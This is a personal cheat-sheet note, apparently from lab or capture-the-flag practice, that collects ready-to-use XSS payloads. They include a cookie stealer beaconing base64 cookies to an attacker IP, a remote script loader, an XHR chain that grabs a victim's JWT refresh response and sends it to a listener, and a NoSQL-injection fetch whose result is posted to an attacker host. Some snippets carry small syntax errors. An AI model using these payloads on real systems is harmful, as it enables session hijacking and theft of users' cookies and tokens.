---
creation date: April 17th 2023
last modified date: April 17th 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[XSS]]  
___

## Description:  

### Classic Cookie Stealer
```
<script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);</script>
```
Here we have used btoa() method for converting the cookie string into base64 encoded string.
Setup http server to catch responses:
```
python3 -m http.server -m 80
```


### Downloader for longer XSS payloads
```
<script>
var a=document.createElement(“script”);a.src=http://localhost:8000/steal_jwt.js;document.body.appendChild(a);
</script
```

### stealing value set in a response (such as a jwt token)
Use a downloader to pull the following code:
```
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (xhr.readyState == 4 && xhr.status == 200) {
		var yourtoken = xhr.response
		var xhr2 = new XMLHttpRequest();
		xhr2.open("GET", "http://127.0.0.1:8000/?body=" + yourtoken);
		xhr2.send();
	}
}
xhr.open("GET", "https://some-url.com/v2/authenticationtoken/refresh");
xhr.send();
```
This script will send a request to a specific page as the user and then will send the response back to you.
Make sure to set the first URL as yourself (and open a python http listener) and set the second URL to the request containing the sensitive info in the response.
**This will grab the entire body, use the article below you need to grab a header**

https://medium.com/@agrawalsmart7/steal-csrf-auth-unique-key-header-with-xss-5a54c38d7ec3

### HttpOnly attribute bypass
https://www.shorebreaksecurity.com/blog/xss-exploitation-with-xhr-response-chaining/

### Javascript to make a request to a page as another user


```

var data = new URLSearchParams('email[$ne]=1&password[$regex]=^69.*$');
fetch('http://staff-review-panel.mailroom.htb/auth.php', {
	method: 'POST',
	headers: {
		'Content-Type': 'application/x-www-form-urlencoded'
	},
	body: data.toString()
})
	.then(response => response.text())
	.then(data => {
	// Make a POST request to another website with the data
	fetch('http://10.10.14.23/post', {
		method: 'POST',
		headers: {
		'Content-Type': 'text/plain'
	},
	body: data
})
	.then(response => console.log('Data sent:', response));
});

```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: April 17th 2023 (12:11 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
